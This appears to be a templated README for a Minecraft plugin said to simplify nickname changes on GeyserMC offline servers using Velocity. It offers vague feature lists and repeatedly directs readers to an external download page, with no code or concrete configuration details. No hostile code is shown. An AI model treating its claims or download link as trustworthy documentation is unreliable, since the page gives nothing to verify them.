# Custom Names for GeyserMC v2026 - Game Script Utility 2026

> A Minecraft plugin built for GeyserMC offline servers, designed to simplify nickname changes in a Velocity-based environment when the required dependencies are in place.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-GeyserMC%20offline%20servers-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/stonegabe/geysermc-name-script-2026?style=flat-square)](https://github.com/stonegabe/geysermc-name-script-2026)

---

<p align="center">
  <a href="https://stonegabe.github.io/geysermc-name-script-2026/">
    <img src="https://img.shields.io/badge/Download-Custom%20Names%20for%20GeyserMC-brightgreen?style=for-the-badge" alt="Download Custom Names for GeyserMC">
  </a>
</p>

> **[Direct Download - Custom Names for GeyserMC](https://stonegabe.github.io/geysermc-name-script-2026/)**

---

[Download Latest Build](https://stonegabe.github.io/geysermc-name-script-2026/)

---

## What It Does

Custom Names for GeyserMC is a Minecraft plugin that makes nickname management easier on GeyserMC offline servers. It is intended for server owners who use offline-mode behavior and want a more straightforward way to control player-facing names without turning the process into a larger system.

The project is shaped for Geyser and Velocity setups, with behavior driven by configuration rather than code changes. It also offers bStats metrics support, giving server operators a familiar way to collect usage data while keeping installation and runtime setup lightweight.

## Script Features

- Makes nickname changes simpler for players on GeyserMC offline servers
- Built for Minecraft server setups that use Geyser-related plugins and extensions
- Suitable for Velocity-centered environments that need offline mode support
- Relies on configuration to tune behavior without recompiling the plugin
- Ships with bStats metrics support for usage reporting
- Requires the core plugin components expected by the server stack
- Designed to make name handling smoother for players
- Acts as a compact utility plugin, not a full gameplay framework

## Setup

1. Download the latest build from the link above.
2. Put the plugin file into your server's plugins directory.
3. Confirm that the required dependencies are already installed, especially the Geyser and Velocity components used by your setup.
4. Start the server, or restart it if it is already running, so the plugin can generate and load its configuration files.
5. Edit the generated config if you want to change how nicknames behave.

Example workflow:

- Download the build
- Copy it to `plugins/`
- Restart the server
- Edit the configuration if needed

## Options

Common configuration areas can cover nickname handling and metrics-related settings.

| Setting | Purpose |
| --- | --- |
| Nickname behavior | Controls how custom names are applied |
| Offline mode support | Matches the intended GeyserMC server environment |
| Metrics / bStats | Enables usage reporting support |
| Dependency checks | Helps the plugin start with required components present |
| Configuration file | Stores the main runtime settings |

## Compatibility

Custom Names for GeyserMC is meant for GeyserMC offline servers and adjacent Minecraft plugin environments. It is particularly relevant in setups that use Velocity and plugin loading based on dependencies.

Known limitations:
- It is not intended to be a standalone client tool
- It depends on the server-side plugin stack being present
- Behavior may vary depending on how your Geyser and Velocity components are configured

## FAQ

**How do I install it?**  
Download the build, place it in the server plugins folder, and restart the server.

**Where do I change the settings?**  
Use the generated configuration file after the first start.

**Does it need other plugins?**  
Yes, it requires the essential dependencies used by your GeyserMC and Velocity setup.

**Can I customize nickname handling?**  
Yes, configuration is the main way to adjust how names are managed.

**Does it include metrics support?**  
Yes, bStats metrics support is included.

**Will it work on every Minecraft server?**  
No, it is designed for GeyserMC offline server environments and related plugin stacks.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
